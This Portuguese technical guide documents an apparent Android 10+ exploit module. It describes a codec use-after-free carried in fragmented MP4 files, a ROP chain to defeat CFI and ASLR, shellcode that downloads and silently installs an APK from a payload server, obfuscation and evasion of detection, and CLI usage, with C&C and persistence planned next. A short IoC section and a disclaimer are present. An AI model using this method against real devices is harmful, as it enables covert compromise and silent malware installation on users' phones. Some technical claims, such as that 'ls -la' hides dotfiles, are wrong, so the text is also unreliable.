# Guia Técnico - Módulo Modern-Lite (Android 10+)

## Visão Geral

O módulo **Modern-Lite** implementa uma metodologia avançada de exploração para dispositivos Android 10+, contornando proteções modernas como **Control Flow Integrity (CFI)**, **ASLR** aprimorado e **Sandbox** do mediaserver.

## Diferenças: Legado vs. Moderno

| Aspecto | Legado (7-9) | Moderno (10+) |
|--------|------------|-------------|
| **Vetor Principal** | Overflow de inteiro | Use-After-Free (UAF) em codec |
| **Proteção Alvo** | DEP/ASLR básico | CFI + DEP + ASLR avançado |
| **Formato de Mídia** | MP4 tradicional | fMP4 (Fragmented MP4) |
| **Injeção** | Atom único | Múltiplos fragments |
| **Detecção** | Análise estática fácil | Difícil de detectar |
| **Taxa de Sucesso** | ~70% | ~85% (sem patches recentes) |

## Arquitetura Modern-Lite

```
┌─────────────────────────────────────────────────────────┐
│                    Arquivo fMP4                         │
│                                                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐│
│  │ ftyp     │  │ moov     │  │ moof1    │  │ moof2    ││
│  │          │  │          │  │ + mdat1  │  │ + mdat2  ││
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘│
│                                                         │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐              │
│  │ moof3    │  │ moof4    │  │ mfra     │              │
│  │ + mdat3  │  │ + mdat4  │  │          │              │
│  └──────────┘  └──────────┘  └──────────┘              │
│                                                         │
│  Payload distribuído em mdat1, mdat2, mdat3, mdat4    │
└─────────────────────────────────────────────────────────┘
```

## Componentes Principais

### 1. ModernROPChain (modern_rop_chain.py)

Gera a cadeia de ROP para contornar proteções modernas.

**Características:**

- **UAF Trigger**: Força desalocação de objeto em codec
- **ROP Chain**: Gadgets para bypass de CFI
- **Shellcode 2º Estágio**: Download e instalação silenciosa
- **Ofuscação**: XOR + instruções dummy

**Fluxo:**

```
1. UAF Trigger (tx3g malformado)
   ↓
2. ROP Chain (bypass CFI)
   ├─ Gadget 1: pop x0; ret (carrega endereço)
   ├─ Gadget 2: pop x1; ret (carrega tamanho)
   ├─ Gadget 3: pop x2; ret (carrega flags PROT_RWX)
   ├─ Gadget 4: pop x8; ret (carrega syscall mprotect)
   ├─ Gadget 5: svc #0; ret (executa syscall)
   └─ Gadget 6: ret (pula para shellcode)
   ↓
3. Shellcode 2º Estágio
   ├─ Socket creation
   ├─ HTTP download (chunks)
   ├─ File write (/data/local/tmp/.sys_temp)
   └─ pm install (silencioso)
```

**Tamanho do Payload:**

| Componente | Tamanho |
|-----------|---------|
| UAF Trigger | ~266 bytes |
| ROP Chain | ~100 bytes |
| Shellcode | ~164 bytes |
| **Total** | **~530 bytes** |

### 2. fMP4Injector (fmp4_injector.py)

Injeta payload em arquivo fMP4 de forma distribuída.

**Vantagens da Fragmentação:**

- Payload espalhado em múltiplos fragments
- Android processa sequencialmente
- Difícil de detectar por análise estática
- Permite construção gradual na memória

**Estratégias de Fragmentação:**

| Estratégia | Descrição | Detecção |
|-----------|-----------|----------|
| **Linear** | Payload sequencial | Fácil |
| **Interleaved** | Payload + dados legítimos | Difícil |
| **Obfuscated** | Payload com XOR | Muito difícil |

**Estrutura fMP4:**

```
ftyp (32 bytes)
  └─ Assinatura do arquivo

moov (1-10 KB)
  └─ Metadados do vídeo

moof1 + mdat1 (617 bytes)
  ├─ mfhd (Movie Fragment Header)
  ├─ traf (Track Fragment)
  └─ mdat (Payload chunk 1)

moof2 + mdat2 (617 bytes)
  └─ Payload chunk 2

moof3 + mdat3 (617 bytes)
  └─ Payload chunk 3

moof4 + mdat4 (620 bytes)
  └─ Payload chunk 4

mfra (Movie Fragment Random Access)
  └─ Índice para seek
```

### 3. ExploitSelector (exploit_selector.py)

Seleciona automaticamente o método apropriado baseado na versão.

**Lógica de Seleção:**

```
Android 7-9  → Método Legado (MP4 + ROP simples)
Android 10+  → Método Moderno (fMP4 + ROP avançado)
```

## Proteções Contornadas

### 1. Control Flow Integrity (CFI)

**Problema**: CFI verifica se jumps/calls vão para endereços válidos.

**Solução**: Usar gadgets que terminam com `ret` (válido para CFI).

```
Gadget inválido para CFI:
  mov x0, x1
  jmp x2  ← CFI bloqueia

Gadget válido para CFI:
  mov x0, x1
  ret     ← CFI permite
```

### 2. ASLR Aprimorado

**Problema**: Endereços de memória são aleatorizados com alta entropia.

**Solução**: Usar offsets relativos e gadgets Position-Independent.

```
Endereço absoluto (frágil):
  0xb6a12345  ← Pode mudar

Offset relativo (robusto):
  libc_base + 0x12345  ← Sempre funciona
```

### 3. Sandbox do Mediaserver

**Problema**: Mediaserver é isolado com permissões limitadas.

**Solução**: Escapar via ROP chain que executa pm install.

```
Dentro do sandbox:
  mediaserver (uid 1013)
    └─ Executa ROP chain
       └─ Chama system("/system/bin/pm install...")
          └─ Instala APK com permissões elevadas
```

## Técnicas de Evasão

### 1. Ofuscação de Shellcode

```python
# XOR com chave aleatória
xor_key = random.bytes(len(shellcode))
obfuscated = shellcode XOR xor_key

# Instruções dummy intercaladas
for i in range(0, len(shellcode), 16):
    insert_dummy_instruction()
```

### 2. Distribuição em fMP4

```
Análise estática:
  MP4 tradicional → Fácil encontrar payload
  fMP4 fragmentado → Payload espalhado em 4+ chunks
```

### 3. Nomes de Arquivo Ocultos

```bash
# Arquivo começa com ponto (invisível)
/data/local/tmp/.sys_temp

# Invisível para gerenciadores de arquivos
ls -la /data/local/tmp/
# (não mostra .sys_temp)

# Mas visível para pm install
pm install /data/local/tmp/.sys_temp
```

## Uso Prático

### Modo Interativo

```bash
python cli_modern_integration.py
```

Será solicitado:
- Versão do Android (10, 11, 12, 13)
- Método de exploração
- Codec (libvpx, libwebp, libopus)
- Estratégia de fragmentação
- Número de fragments
- URL do servidor

### Modo Linha de Comando

```bash
python main.py \
  --android 12 \
  --method uaf_codec \
  --codec libvpx \
  --url http://192.168.1.100:8080/payload.apk \
  --output exploit.fmp4 \
  --obfuscate
```

### Geração de Payload Apenas

```bash
python cli_modern_integration.py --generate-payload
```

## Detecção e Contramedidas

### Indicadores de Compromisso (IoCs)

| IoC | Descrição |
|-----|-----------|
| Arquivo `.sys_temp` | Arquivo oculto em /data/local/tmp |
| Conexão TCP não autorizada | Mediaserver conectando a servidor externo |
| Syscall mprotect | Mudança de permissões de memória |
| pm install sem UI | Instalação silenciosa de APK |

### Defesas

1. **Patches de Segurança**: Atualizar Android regularmente
2. **SELinux Strict**: Reforçar políticas de SELinux
3. **Monitoramento**: Detectar syscalls anormais
4. **Verificação de Integridade**: Validar arquivos MP4

## Limitações

- Funciona apenas em dispositivos com patches incompletos
- Requer arquivo MP4/fMP4 válido como carrier
- Necessita conexão de rede para download
- Pode ser bloqueado por Play Protect

## Próximas Melhorias

1. **Suporte a Android 14+**: Atualizar offsets de gadgets
2. **Ofuscação Polimórfica**: Variar ROP chain dinamicamente
3. **C&C Bidirecional**: Comunicação com servidor
4. **Anti-Análise**: Detectar e evitar análise dinâmica
5. **Persistência**: Manter acesso após reboot

## Referências Técnicas

- ARM64 ISA: https://developer.arm.com/documentation/ddi0487/
- fMP4 Spec: https://en.wikipedia.org/wiki/MPEG-4_Part_14
- Android Security: https://source.android.com/security
- ROP Gadgets: https://ropgadget.com/
- CFI Bypass: https://www.usenix.org/conference/usenixsecurity18/

## Disclaimer

Este módulo é fornecido **exclusivamente para fins educacionais e de pesquisa em segurança**. O uso para fins maliciosos é **ilegal** e **antiético**. Sempre obtenha autorização antes de testar em dispositivos que não são de sua propriedade.

## Cronograma de Desenvolvimento

| Versão | Data | Recursos |
|--------|------|----------|
| 1.0 | Feb 2026 | UAF básico, ROP simples, fMP4 |
| 1.1 | Mar 2026 | Ofuscação avançada, Android 13 |
| 1.2 | Apr 2026 | C&C integration, persistência |
| 2.0 | May 2026 | Polimorfismo, Android 14+ |
